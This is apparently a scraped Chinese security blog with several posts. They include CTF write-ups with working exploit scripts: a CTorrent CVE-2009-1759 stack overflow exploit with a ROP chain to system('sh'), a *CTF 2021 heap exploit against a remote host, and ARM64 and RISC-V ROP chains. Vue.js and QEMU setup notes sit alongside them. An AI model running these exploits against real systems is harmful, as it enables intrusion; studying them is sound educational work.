.torrent文件是BT种子文件格式，CTorrent是该文件格式的解析器。由于解析器解析过程中某个解析函数缺少长度检测，在解析由用户可控大小的Path时会将用户输入memcpy到栈上定长buffer，可造成栈溢出，ROP提权。 复现契机来自于强网先锋[强网杯2021final] ","date":"2021-07-12","objectID":"/2021/07/cve-2009-1759/:1:0","tags":null,"title":"CVE 2009 1759","uri":"/2021/07/cve-2009-1759/"},{"categories":["PWN"],"content":"Details ctf赛题为Enhanced CTorrentdnh3.3.1的nday，尝试下载对应版本的ctorrent源码，可以看到在解析torrent文件时会调用btfiles.cpp/btFiles::BuildFromMI() 关键部分如上图，可以看到path为定长数组，在decode_list2path()中将其作为参数传入。bencode.cpp/decode_list2path()将用户指定大小的内容memcpy到path中，而并没有进行长度检测，导致溢出。 bencode为BT种子的编码格式，详见 https://zh.wikipedia.org/wiki/Bencode 经过分析，该函数是在解析torrent结构的FILES时，若path是list时调用的解析函数。我们可以精心构造path，通过栈溢出去做ROP or shellcode. 以强网先锋为例，exp如下 from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'info' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] io = process(\"./ctorrent\", aslr=False) # 0x15555502aea2 -\u003e crash # 0x402c7f ret # 0x402c7e pop rdi, ret # 0x400f24 \"sh\\x00\" # 0x4022A0 system # p64(0x402c7f) + rop = b'A' * 4152 + p64(0x402c7f) + p64(0x402c7e) + p64(0x400f24) + p64(0x4022A0) size = 4176 + 8 pay = b\"d\" pay += b\"8:announce\" pay += b\"20:http://0000/announce\" pay += b\"13:creation date\" pay += b\"i1111e\" pay += b\"4:info\" pay += b\"d\" ################ pay += b\"5:files\" pay += b\"ld\" pay += b\"4:path\" pay += b\"l\" pay += bytes(str(size).encode(\"utf-8\")) + b\":\" pay += rop # when parsing, memcpy to stack causing oveflow. pay += b\"e\" pay += b\"6:length\" pay += b\"i2222e\" pay += b\"ee\" ################ pay += b\"4:name\" pay += b\"4:4444\" pay += b\"12:piece length\" pay += b\"i3333e\" pay += b\"6:pieces\" pay += b\"20:\" + bytes.fromhex(\"9f3d4e7c80e58146707d9e8ace218ee33cefeca9\") pay += b\"ee\" # with open(\"./vul.torrent\", \"wb\") as f: # f.write(pay) # with open(\"./pay\", \"rb\") as f: # pay = f.read() # b *0x40a2d8 # gdb.attach(io, \"b *0x15555502afbc\") # print(pay) io.sendlineafter(\" Size of your torrent file \u003e\\n\", str(len(pay))) io.sendlineafter(\"Please input your torrent file \u003e\\n\", pay) io.interactive() 读者可以在0x40a2d8处断下，体会溢出点在哪儿。 ","date":"2021-07-12","objectID":"/2021/07/cve-2009-1759/:2:0","tags":null,"title":"CVE 2009 1759","uri":"/2021/07/cve-2009-1759/"},{"categories":["PWN"],"content":"More 这题直接跳转到system(“sh\\x00”)并不能打通，调试system函数发现在该位置处产生segment fault. 查阅资料发现 movaps：单精度浮点数指令，必须16字节对齐 movups：单精度浮点数指令，不需要16字节对齐 所以需要再找一个ret的gadget，把栈向上抬到任意16字节对齐的位置即可。 成功打通 事后找到了出现类似问题的帖子[http://blog.eonew.cn/archives/958] 看来也算是自己重新踩了一遍坑。 ","date":"2021-07-12","objectID":"/2021/07/cve-2009-1759/:3:0","tags":null,"title":"CVE 2009 1759","uri":"/2021/07/cve-2009-1759/"},{"categories":["PWN"],"content":"Reference https://www.securityfocus.com/bid/34584/discuss https://www.scaprepo.com/control.jsp?command=search\u0026search=CVE-2009-1759\u0026SCAP-TOKEN=O1B0-JQFA-GM0R-MFK8-VQE6-JHQX-JFU0-FJVG https://www.exploit-db.com/exploits/8470 ","date":"2021-07-12","objectID":"/2021/07/cve-2009-1759/:4:0","tags":null,"title":"CVE 2009 1759","uri":"/2021/07/cve-2009-1759/"},{"categories":["Pause-and-Ponder"],"content":"最近写应用程序感觉 python,java 的 gui 太丑了，咨询了一波web爷爷。在一星期内从零开始入门了前后端分离的开发框架，并成功赶在实验截止日期前套用，治好了我的强迫症. 在这个过程中不成体系且稀碎地顺手记录了一下，权当纪念这段爆肝的日子。 技术栈如下，主要学习量为vue.js 前端 vue.js element-ui electron 后端 python flask 学习路线 (html, css, js) -\u003e Vue.js html 4.20 css 4.21 Javascript 4.22-4.23 vue、electron 4.24-4.25 整体来说对vue.js与electron还是一知半解，但也顺利地摸出了前端 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:0:0","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"HTML HyperText Markup Language https://www.runoob.com/html/html-tutorial.html HTML 不是一种编程语言，而是一种标记语言 标记语言是一套标记标签 (markup tag) Web浏览器用于读取HTML文件，不直接显示HTML标签，而是使用标签展示HTML页面内容 vscode 安装open in browser插件，alt+b即可用默认游览器打开 tips 属性值本身就含有双引号，那么您必须使用单引号，例如：name=‘John “ShotGun” Nelson’ 当显示页面时，浏览器会移除源代码中多余的空格和空行。所有连续的空格或空行都会被算作一个空格。 清华镜像站 bakground:#22222 白:white 蓝:#6793cf 用\u0026#x表示特定字符，x为其ascii码 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:1:0","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"CSS Cascading Style Sheets https://www.runoob.com/css/css-intro.html tips （内联样式）Inline style \u003e （内部样式）Internal style sheet \u003e（外部样式）External style sheet \u003e 浏览器默认样式 1em和当前字体大小相等，=16px 盒子模型 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:2:0","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"JavaScript https://www.runoob.com/js/js-statements.html tips 脚本语言，逐行执行，而不是先整体编译 注释、一行后面有；、function格式 \u003cscript\u003e function myfuc(a, b) { // document.getElementById(\"demo\"); alert(a + b); return 1; } \u003c/script\u003e document.write()直接写到html上。如果网页已经加载完了再触发该函数（比如onclick），将覆盖整个html 大小写敏感，驼峰法的命名规则（eg. myFirstName） 重新声明值不会丢 var carname=\"Volvo\"; var carname; // 仍然是\"Volvo\" 具有动态数据类型， 值类型(基本类型)：字符串（String）、数字(Number)、布尔(Boolean)、对空（Null）、未定义（Undefined）、Symbol。 引用数据类型：对象(Object)、数组(Array)、函数(Function)。 var x; // x 为 undefined var x = 5; // 现在 x 为数字 var x = \"John\"; // 现在 x 为字符串 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:3:0","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"Vue3+electron 开始摸实验了… python flask开后端服务器 element ui组件库写前端组件 electron打包 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:4:0","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"Day1 前端 vue启动 注册、登录组件 注册、登录初级校验 传递参数给后端 后端返回参数 后端 flask启动 从前端接收参数 传输参数给后端 注册、登录数据库校验 axios POST到python后端成功 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:4:1","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"Day2 前端 后端 打包 把electron-quick-start git下来，进去修改main.js，直接把electron当作浏览器，先把vue跑起来，然后直接读这个端口。 // and load the index.html of the app. mainWindow.loadURL('http://127.0.0.1:8081') 如下命令跑起来 npm install npm start 用electron读取网页变为应用程序 下面我们把它彻底包成exe 安装electron-packager npm install -g electron-packager 进入electron-quick-start目录 electron.packager . 得到了彻底前后端分离的高端产物 至此，便完成了一整套开发流程。 更多见 https://github.com/xidoo123/cp-lab5 ","date":"2021-04-20","objectID":"/2021/04/vue_js0/:4:2","tags":null,"title":"Vue.js 初探","uri":"/2021/04/vue_js0/"},{"categories":["Pause-and-Ponder"],"content":"Some birds aren’t meant to be caged，their feathers are just too bright. ","date":"2021-02-12","objectID":"/2021/02/diary0/:0:0","tags":null,"title":"Wh1t3zZ 封禁3周年祭","uri":"/2021/02/diary0/"},{"categories":["PWN"],"content":"qemu是GNU/linux上十分常用的模拟处理器，可以在ubuntu下跑arm\\mips甚至riscv等几乎所有架构的可执行文件，一台机器上可以虚拟化为多种架构的机器。 system mode：系统模式，模拟整个电脑系统，包括中央处理器及其他周边设备。它使得跨平台编写程序得测试与debug工作变得更容易，但是配置比较麻烦，需要在里面起一个linux虚拟机 user mode：用户模式，模拟解析可执行文件的指令，比较方便且功能够用，暂时只记录user模式 ","date":"2021-01-23","objectID":"/2021/01/armpwn/:0:0","tags":null,"title":"ARM PWN 调试环境搭建","uri":"/2021/01/armpwn/"},{"categories":["PWN"],"content":"安装qemu-user ubuntu下 sudo apt-get install qemu user模式支持的架构下载，暂时完全够用了 sudo apt install qemu-user 下载static版本（可选） sudo apt-get install -y qemu-user-static 下载完成后，qemu-自动补全可以看到其支持的架构十分全面 (base) pwn@ubuntu:~$ qemu- qemu-aarch64 qemu-mips qemu-riscv32 qemu-aarch64_be qemu-mips64 qemu-riscv32-static qemu-aarch64_be-static qemu-mips64el qemu-riscv64 qemu-aarch64-static qemu-mips64el-static qemu-riscv64-static qemu-alpha qemu-mips64-static qemu-s390x qemu-alpha-static qemu-mipsel qemu-s390x-static qemu-arm qemu-mipsel-static qemu-sh4 qemu-armeb qemu-mipsn32 qemu-sh4eb qemu-armeb-static qemu-mipsn32el qemu-sh4eb-static qemu-arm-static qemu-mipsn32el-static qemu-sh4-static qemu-cris qemu-mipsn32-static qemu-sparc qemu-cris-static qemu-mips-static qemu-sparc32plus qemu-debootstrap qemu-nbd qemu-sparc32plus-static qemu-hppa qemu-nios2 qemu-sparc64 qemu-hppa-static qemu-nios2-static qemu-sparc64-static qemu-i386 qemu-or1k qemu-sparc-static qemu-i386-static qemu-or1k-static qemu-system-aarch64 qemu-img qemu-ppc qemu-system-arm qemu-io qemu-ppc64 qemu-tilegx qemu-m68k qemu-ppc64abi32 qemu-tilegx-static qemu-m68k-static qemu-ppc64abi32-static qemu-x86_64 qemu-make-debian-root qemu-ppc64le qemu-x86_64-static qemu-microblaze qemu-ppc64le-static qemu-xtensa (base) pwn@ubuntu:~$ ","date":"2021-01-23","objectID":"/2021/01/armpwn/:0:1","tags":null,"title":"ARM PWN 调试环境搭建","uri":"/2021/01/armpwn/"},{"categories":["PWN"],"content":"运行qemu-user 最近*ctf2021中遇到一题名为babypac，是arm64架构 (pwn) pwn@ubuntu:~/share/starctf/babypac$ ls chall chall.i64 chall_patched cmd ld-linux-aarch64.so.1 lib libc.so.6 (pwn) pwn@ubuntu:~/share/starctf/babypac$ checksec ./chall [*] '/mnt/hgfs/linux_share/starctf/babypac/chall' Arch: aarch64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 可以自己配环境，把库全部加到/lib以后用如下命令启动 qemu-aarch64 ./chall 更方便的是指定路径参数等，具体见-h $ qemu-aarch64 -h usage: qemu-aarch64 [options] program [arguments...] Linux CPU emulator (compiled for aarch64 emulation) Options and associated environment variables: Argument Env-variable Description -h print this help -help -g port QEMU_GDB wait gdb connection to 'port' -L path QEMU_LD_PREFIX set the elf interpreter prefix to 'path' -s size QEMU_STACK_SIZE set the stack size to 'size' bytes -cpu model QEMU_CPU select CPU (-cpu help for list) -E var=value QEMU_SET_ENV sets targets environment variable (see below) -U var QEMU_UNSET_ENV unsets targets environment variable (see below) -0 argv0 QEMU_ARGV0 forces target process argv[0] to be 'argv0' -r uname QEMU_UNAME set qemu uname release string to 'uname' -B address QEMU_GUEST_BASE set guest_base address to 'address' -R size QEMU_RESERVED_VA reserve 'size' bytes for guest virtual address space -d item[,...] QEMU_LOG enable logging of specified items (use '-d help' for a list of items) -dfilter range[,...] QEMU_DFILTER filter logging based on address range -D logfile QEMU_LOG_FILENAME write logs to 'logfile' (default stderr) -p pagesize QEMU_PAGESIZE set the host page size to 'pagesize' -singlestep QEMU_SINGLESTEP run in singlestep mode -strace QEMU_STRACE log system calls -seed QEMU_RAND_SEED Seed for pseudo-random number generator -trace QEMU_TRACE [[enable=]\u003cpattern\u003e][,events=\u003cfile\u003e][,file=\u003cfile\u003e] -version QEMU_VERSION display version information and exit Defaults: QEMU_LD_PREFIX = /etc/qemu-binfmt/aarch64 QEMU_STACK_SIZE = 8388608 byte You can use -E and -U options or the QEMU_SET_ENV and QEMU_UNSET_ENV environment variables to set and unset environment variables for the target process. It is possible to provide several variables by separating them by commas in getsubopt(3) style. Additionally it is possible to provide the -E and -U options multiple times. The following lines are equivalent: -E var1=val2 -E var2=val2 -U LD_PRELOAD -U LD_DEBUG -E var1=val2,var2=val2 -U LD_PRELOAD,LD_DEBUG QEMU_SET_ENV=var1=val2,var2=val2 QEMU_UNSET_ENV=LD_PRELOAD,LD_DEBUG Note that if you provide several changes to a single variable the last change will stay in effect. See \u003chttps://qemu.org/contribute/report-a-bug\u003e for how to report bugs. More information on the QEMU project at \u003chttps://qemu.org\u003e. 用-L指定来lib位置即可，我们直接运行如下命令就可以跑起来 qemu-aarch64 -cpu max -L . ./chall 当然，出题人帮我们写了个启动脚本，只要正确安装qemu并且有aarch64架构便能直接运行。 (pwn) pwn@ubuntu:~/share/starctf/babypac$ ./cmd # # #### ##### ###### # # # # # # ### ### # # ##### # # # # # # # # # # # #### # # ","date":"2021-01-23","objectID":"/2021/01/armpwn/:0:2","tags":null,"title":"ARM PWN 调试环境搭建","uri":"/2021/01/armpwn/"},{"categories":["PWN"],"content":"调试ARM 先安装gdb-multiarch sudo apt-get gdb-multiarch 以*CTF2021 babypac为例，调试bash如下，选择端口为23333 #!/bin/sh gdb-multiarch -q \\ -ex 'set architecture aarch64' \\ # 指定架构 -ex 'file chall' \\ # 指定文件 -ex 'target remote localhost:23333' \\ # 指定端口 -ex 'break *0x400C00' \\ -ex 'break *0x400FF0' \\ # 下断点 -ex continue \\ ; exp中-g指定端口，-L指定lib位置 io = process([\"qemu-aarch64\", \"-cpu\", \"max\", \"-g\", \"23333\", \"-L\", \".\", \"./chall\"]) 然后先跑exp，再跑bash就能进行调试 ","date":"2021-01-23","objectID":"/2021/01/armpwn/:0:3","tags":null,"title":"ARM PWN 调试环境搭建","uri":"/2021/01/armpwn/"},{"categories":["PWN"],"content":"赛前科恩那边说二进制的题应该没什么难度，我知道我很弱了不要再说了…放假比较闲那就慢慢复现学习一下吧 babyheap：tcache_struct, double free, 新libc babypac：ARMv8.3, pac, ROP fav arch1：RISC-V64 ROP fav arch2：qemu sandbox bypass, RISC-V ROP babygame： C++析构函数, double free babyxv6：RISC-V, kernel, 自定义漏洞syscall ","date":"2021-01-23","objectID":"/2021/01/starctf2021/:0:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"babyheap 用的新libc2.27，添加了类似于2.29的tcache检测，最新的diff如下。提前已经知道了所以这题出的很快，可惜没抢到血。 由于edit改不了前面的8个字节，所以double free只能先打到堆上tcache结构体，使任意分配的同时将0x410的tcache的count填满，让输入name的chunk能直接进入unsorted bin去泄露libc地址，最后tcache poisoning去打free_hook（one_gadget没打通所以没打malloc_hook） #coding:utf-8 from pwn import * # import pwn_framework as pf from time import sleep import sys global io ru = lambda p, x : p.recvuntil(x) sn = lambda p, x : p.send(x) rl = lambda p : p.recvline() sl = lambda p, x : p.sendline(x) rv = lambda p, x=1024 : p.recv(numb = x) sa = lambda p, a, b : p.sendafter(a,b) sla = lambda p, a, b : p.sendlineafter(a,b) rr = lambda p, t : p.recvrepeat(t) rd = lambda p, x : p.recvuntil(x, drop=True) # amd64 or x86 context(arch = 'amd64', endian = 'little') context.log_level = 'debug' filename = \"./pwn\" ip = \"52.152.231.198\" port = 8081 LOCAL = False if len(sys.argv)==1 else False global bps # Break Points global gds # Gdb Debug Symbols bps = [] gds = {} elf = ELF(filename) remote_libc = \"./libc.so.6\" if LOCAL: io = process(filename, aslr=False) libc = ELF(remote_libc) else: context.log_level = 'info' io = remote(ip, port) libc = ELF(remote_libc) def choice(p, idx): sla(p, XXX, str(idx)) def lg(name, val): log.info(name+\" : \"+hex(val)) def add(idx, size): sla(io,\"\u003e\u003e \",'1') sla(io,\"input index\\n\",str(idx)) sla(io,\"input size\\n\",str(size)) def edit(idx, con): sla(io,\"\u003e\u003e \",'3') sla(io,\"input index\\n\",str(idx)) sla(io,\"input content\\n\",con) def free(idx): sla(io,\"\u003e\u003e \",'2') sla(io,\"input index\\n\",str(idx)) def show(idx): sla(io,\"\u003e\u003e \",'4') sla(io,\"input index\\n\",str(idx)) def input_name(name): sla(io,\"\u003e\u003e \",'5') sla(io,\"your name:\\n\",name) def show_name(): sla(io, \"\u003e\u003e \", '6') add(0, 0x60) for i in range(7): free(0) edit(0, str(i)) add(1, 0x50) for i in range(7): free(1) edit(1, str(i)) show(0) heap_addr = u64(io.recv(6)+'\\x00\\x00') lg(\"heap_addr\", heap_addr) free(0) free(1) input_name(p64(heap_addr - 0x260 + 0x40)) for i in range(2): add(2, 0x60) edit(2, p64(0x0707070707070707)) add(3, 0x20) free(0) show(0) libc_addr = u64(io.recv(6)+'\\x00\\x00') - 0x3ebca0 lg(\"libc_addr\", libc_addr) # raw_input() malloc_hook = libc_addr + libc.sym['__malloc_hook'] lg(\"malloc_hook\", malloc_hook) free_hook = libc_addr + libc.sym['__free_hook'] lg(\"free_hook\", free_hook) sys_addr= libc_addr + libc.sym['system'] edit(2, p64(0x0707070707070707)+p64(free_hook-8)*2) one = [0x10a41c, 0x4f432, 0x4f3d5] add(4, 0x20) edit(4, p64(sys_addr)) add(5, 0x40) edit(5, '/bin/sh\\x00'*3) edit(2, p64(0x0707070707070707)+p64(heap_addr+0x10)*3) add(5, 0x30) free(5) io.interactive() ","date":"2021-01-23","objectID":"/2021/01/starctf2021/:1:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"babypac arm64架构，装好qemu-user后直接运行cmd就能跑 auth与lock函数都可以负溢出，于是可以充分利用最先输入的name让其成功auth，进入到后门函数sub_400BDC，为qemu-user的arm64栈溢出。题目中pac的意思为Pointer authentication，是ARMv8.3-A对抗ROP攻击的一项技术，攻破该技术便是出题者的意图。 ssize_t sub_400BDC() { __int64 v1; // [xsp+0h] [xbp-20h] BYREF return read(0, \u0026v1, 0x100uLL); // stack_overflow } 如果没有注意到负溢出，直接硬刚sub_4009D8也行，但是注意PACIA命令 unsigned __int64 __fastcall sub_4009D8(__int64 a1) { return a1 ^ (a1 \u003c\u003c 7) ^ ((a1 ^ (unsigned __int64)(a1 \u003c\u003c 7)) \u003e\u003e 11) ^ ((a1 ^ (a1 \u003c\u003c 7) ^ ((a1 ^ (unsigned __int64)(a1 \u003c\u003c 7)) \u003e\u003e 11)) \u003c\u003c 31) ^ ((a1 ^ (a1 \u003c\u003c 7) ^ ((a1 ^ (unsigned __int64)(a1 \u003c\u003c 7)) \u003e\u003e 11) ^ ((a1 ^ (a1 \u003c\u003c 7) ^ ((a1 ^ (unsigned __int64)(a1 \u003c\u003c 7)) \u003e\u003e 11)) \u003c\u003c 31)) \u003e\u003e 13); } 他会先将0x10A9FC70042填充成0x**10A9FC70042，其中**是未知的，然后再进入sub_4009D8进行一系列encode操作，所以只能爆破这两个**，比较麻烦。这一个未知的字节便是PAC，我们稍后也会遇到。 .text:0000000000400D54 loc_400D54 ; CODE XREF: auth+74↑j .text:0000000000400D54 MOV X8, #0x10A9FC70042 .text:0000000000400D60 STR X8, [SP,#0x20+var_10] .text:0000000000400D64 LDR X8, [SP,#0x20+var_10] .text:0000000000400D68 PACIA X8, SP .text:0000000000400D6C STR X8, [SP,#0x20+var_10] .text:0000000000400D70 LDURSW X8, [X29,#var_4] .text:0000000000400D74 ADRL X9, name .text:0000000000400D7C ADD X8, X9, X8,LSL#4 .text:0000000000400D80 LDR X8, [X8,#0x20] .text:0000000000400D84 LDR X0, [SP,#0x20+var_10] .text:0000000000400D88 STR X8, [SP,#0x20+var_20] .text:0000000000400D8C BL encode 而如果利用负溢出漏洞，idx=-1就是我们可控的name区域，所以事先填入0x10A9FC70042后lock(-1)并auth(-1)就能通过校验，进入到栈溢出函数。 我们先把ROP链写好。先简单说一下ARM64的指令集与常识 ARM64 取消了32位的 LDM,STM,PUSH,POP指令，取而代之的是str\\stp、ldr\\ldp ARM64 里面对栈的操作是16字节对齐 sp寄存器在任意时刻会保存栈顶的地址 fp寄存器也称为x29寄存器属于通用寄存器,但是在某些时刻我们利用它保存栈底的地址 x30：链接寄存器（LR），用于保存子程序的返回地址 ARM64用寄存器传参 来看看栈溢出函数，用BL调用了read函数后开始还原栈帧 X29=fp=[SP+0x20]，相当于x86的还原上一个栈帧的rbp X30=LR=[SP+0x28]，ARM64把返回地址放在寄存器LR内，在栈上的位置也是rbp+8 将sp直接向上提0x30，复原栈顶指针 最后retaa返回到返回地址 可以看到ARM64的fp(rbp)是通过直接赋值来还原的，所以在布置ROP链的时候总是要考虑rbp的位置 backdoor ; CODE XREF: auth:loc_400DA0↓p .text:0000000000400BDC .text:0000000000400BDC var_s0 = 0 .text:0000000000400BDC .text:0000000000400BDC PACIASP .text:0000000000400BE0 SUB SP, SP, #0x30 .text:0000000000400BE4 STP X29, X30, [SP,#0x20+var_s0] .text:0000000000400BE8 ADD X29, SP, #0x20 .text:0000000000400BEC MOV W8, WZR .text:0000000000400BF0 MOV X2, #0x100 ; nbytes .text:0000000000400BF4 MOV X1, SP ; buf .text:0000000000400BF8 MOV W0, W8 ; fd .text:0000000000400BFC BL .read .text:0000000000400C00 LDP X29, X30, [SP,#0x20+var_s0] .text:0000000000400C04 ADD SP, SP, #0x30 ; '0' .text:0000000000400C08 RETAA 一般来说可以找一些gadget然后mprotect写shellcode，这里没开NX所以直接在bss段写就行。 参考https://blog.csdn.net/qq_39869547/article/details/105255683 这段gadget位于csu处，是一定会有的 .text:0000000000400FD8 loc_400FD8 ; CODE XREF: sub_400F90+64↓j .text:0000000000400FD8 LDR X3, [X21,X19,LSL#3] .text:0000000000400FDC MOV X2, X24 .text:0000000000400FE0 ADD X19, X19, #1 .text:0000000000400FE4 MOV X1, X23 .text:0000000000400FE8 MOV W0, W22 .text:0000000000400FEC BLR X3 .text:0000000000400FF0 CMP X20, X19 .text:0000000000400FF4 B.NE loc_400FD8 .text:0000000000400FF8 .text:0000000000400FF8 loc_400FF8 ; CODE XREF: sub_400F90+3C↑j .text:0000000000400FF8 LDP X19, X20, [SP,#var_s10] .text:0000000000400FFC LDP X21, X22, [SP,#var_s20] .text:0000000000401000 LDP X23, X24, [SP,#var_s30] .text:0000000000401004 LDP X29, X30, [SP+var_s0],#0x40 .text:0000000000401008 RET 该ROP链的思路是： Info\r\r布置栈帧→ 跳到loc_400FF8控制X19-X30 → 返回到loc_400FD8 → 控制X0-X3（控制参数）→ 跳到X3(read@got) → 写shellcode → 使X20=X19让其不跳回loc_400FD8而继续执行 → 再次控制X19-X30 → 返回到shellcode处getshell\r\r 所以我们的ROP链如下： \"\"\" w0 = w22 x1 = x23 x2 = x24 x3 = [X21+X19\u003c\u003c3] -\u003e read x19 = 0 x20 = 0 x21 = read_addr x22 = 0 x23 = sc_addr x24 = 0x100 x29 = stack_frame \"\"\" fake_fp = 0x412500 // .bss sc_addr = 0x412060 // .bss rop = 'a'*0x20 rop += flat(fake_fp, 0x400FF8, // fp0, ret_addr0 // -\u003ewhen in 0x400FF8, sp is here fake_fp, 0x400FD8, // X29, X30 0, 0, // X19, X20 read_got, 0, //X21, X22-\u003eX0 sc_addr, 0x100, //X23-\u003eX1, X24-\u003eX2 fake_fp, sc_addr ) 这样直接ROP会被PAC拦截 [*] Switching to interactive mode [DEBUG] Received 0","date":"2021-01-23","objectID":"/2021/01/starctf2021/:2:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"favourite architecture 1 risc-v架构，64位，用Ghidra9.2反编译。符号表被扬了 undefined8 UndefinedFunction_00010400(void) { ulonglong uVar1; longlong lVar2; undefined auStack488 [192]; undefined auStack296 [256]; ulonglong uStack40; longlong lStack32; int iStack20; FUN_00017d74(PTR_DAT_0006ea28,0); FUN_00017d74(PTR_DAT_0006ea20,0); FUN_00017d74(PTR_DAT_0006ea18,0); FUN_0001605a(\"Input the flag: \"); FUN_00016a5a(auStack296); uVar1 = FUN_000204e4(auStack296); if (uVar1 == ((longlong)(iRam000000000006e9dc + iRam000000000006e9d8) \u0026 0xffffffffU)) { lStack32 = FUN_00020386(auStack296 + ((longlong)iRam000000000006e9d8 \u0026 0xffffffff)); FUN_0001118a(auStack488,\"tzgkwukglbslrmfjsrwimtwyyrkejqzo\",\"oaeqjfhclrqk\",0x80); FUN_000111ea(auStack488,auStack296,iRam000000000006e9d8); lVar2 = FUN_00020e2a(auStack296,\u0026DAT_0006d000,iRam000000000006e9d8); if (lVar2 == 0) { uStack40 = FUN_000204e4(lStack32); iStack20 = 0; while( true ) { if (uStack40 \u003e\u003e 3 \u003c= (ulonglong)(longlong)iStack20) { FUN_00016bc8(\"You are right :D\"); gp = (undefined *)0x6f178; return 0; } FUN_000102ae(iStack20 * 8 + lStack32,\u0026DAT_0006d060); lVar2 = FUN_00020e2a(iStack20 * 8 + lStack32,(longlong)(iStack20 * 8) + 0x6d030,8); if (lVar2 != 0) break; iStack20 = iStack20 + 1; } } } FUN_00016bc8(\"You are wrong ._.\"); gp = (undefined *)0x6f178; return 1; } 用题目给的qemu跑一下 $ ./qemu-riscv64 ./main Input the flag: 1 You are wrong ._. $ 人工fuzz一下，出现段错误 io.sendlineafter(\"Input the flag: \",'a'*0x120+'b'*8) 猜测读入的函数为gets()，没有检测读入长度。 (gdb) c Continuing. Program received signal SIGSEGV, Segmentation fault. 0x6262626262626262 in ?? () (gdb) 边调试边尝试恢复程序主要流程（逆向部分favourite architecture 0省略），是一个RISC-V64的栈溢出。auStack296在s0-0x128处，返回地址距离栈底0x120 undefined8UndefinedFunction_00010400(void){ulonglonguVar1;longlonglVar2;undefinedauStack488[192];undefinedauStack296[256];ulonglonguStack40;longlonglStack32;intiStack20;init_buf(PTR_DAT_0006ea28,0);init_buf(PTR_DAT_0006ea20,0);init_buf(PTR_DAT_0006ea18,0);pRint(\"Input the flag: \");gEts(auStack296);// stack_overflow ...} 下面我们来做RISC-V ROP，控制ra, a0-a2等寄存器便能任意执行函数。 在ghidra中查找包含c.ldsp指令的gadget以控制寄存器，只能直接找到控制saved regs的片段 LAB_0001179e 0001179e e2 70 c.ldsp ra,0x38 (sp) # 栈上内容送reg 000117a0 42 74 c.ldsp s0,0x30 (sp) 000117a2 a2 74 c.ldsp s1,0x28 (sp) 000117a4 02 79 c.ldsp s2,0x20 (sp) 000117a6 e2 69 c.ldsp s3,0x18 (sp) 000117a8 42 6a c.ldsp s4,0x10 (sp) 000117aa a2 6a c.ldsp s5,0x8 (sp) 000117ac 21 61 c.addi16 sp,0x40 # sp += 0x40 000117ae 82 80 ret # jalr ra 但我们知道一定会有把saved regs送往常用寄存器的gadget，实际上就在上面就有一条完整的利用链。由于没有got表，所以通过控制a5并利用0x0011796的跳转来实现任意地址执行。注意与x86不同的是，ret指令并不会改变sp位置。 00011772 93 07 84 b8 addi a5,s0,-0x478 # a5 = s0 - 0x478 00011776 13 09 09 b9 addi s2,s2,-0x470 0001177a 33 09 f9 40 sub s2,s2,a5 # s2 -= 0x470 + a5 0001177e 13 59 39 40 srai s2,s2,0x3 # s2 \u003e\u003e= 3 00011782 63 0e 09 00 beq s2,zero ,LAB_0001179e # s2=0则跳转 LAB_0001178c 0001178c 1c 60 c.ld a5=\u003e-\u003eFUN_00010284 ,0x0 (s0=\u003e-\u003eFUN_00010250 ) 0001178e 56 86 c.mv a2,s5 # s5 -\u003e a2 00011790 d2 85 c.mv a1,s4 # s4 -\u003e a1 00011792 4e 85 c.mv a0,s3 # s3 -\u003e a0 00011794 85 04 c.addi s1,0x1 00011796 82 97 c.jalr a5=\u003eFUN_00010284 # 无条件跳转，并且把下一条指令写进ra（跳回继续执行） 00011798 21 04 c.addi s0,0x8 0001179a e3 19 99 fe bne s2,s1,LAB_0001178c # s1≠s2则跳转 整体思路为 跳到0x1179e控制s0-s5与ra ret到0x11772，使a5=target_fn, s2=0 跳转到0x1179e再次控制s0-s5与ra ret到0x1178e控制a0-a2，执行target_fn，使s1=s2，让其继续执行到0x1179e 控制ra并重新回到main函数 def ROP_ctrl(target_fn, para1, para2, para3): payload = 'a'*0x120 payload += flat(0x1179e, 0, 0, 0, # s5, s4 0, target_fn+0x470, # s3, s2 0, target_fn+0x478, # s1, s0 0x11772, # ra 0, para3, para2, # s5, s4 para1, 1, # s3, s2 0, 0, # s1, s0 0x1178e, # ra 0, 0, 0, 0, 0, 0, 0, # s0-s5 main_addr, # ra ) return payload 至此我们便可以随心所欲地ROP了，最后需要找到orw的系统调用，RISC-V64用a7保存调用号。 openat：FUN_000221cc ************************************************************* * FUNCTION ************************************************************* undefined FUN_000221cc () 000221cc 37 de 06 00 lui t3,0x6d 000221d0 83 3e 0e ba ld t4,-0x460 (t3=\u003eDAT_0006cba0 ) 000221d4 5d 71 c.addi16 sp,-0x50 00","date":"2021-01-23","objectID":"/2021/01/starctf2021/:3:0","tags":null,"title":"*CTF 2021","uri":"/2021/01/starctf2021/"},{"categories":["PWN"],"content":"favourite arch 2 这题要求执行/readflag2，我们必须更进一步拿到shell。 漏洞同样是用户态程序的栈溢出，远程环境中的qemu被patch过，限制了其模拟程序时执行一些syscall，即在riscv层面上无法getshell。所以这题要直接日穿qemu，rce而不只是orw 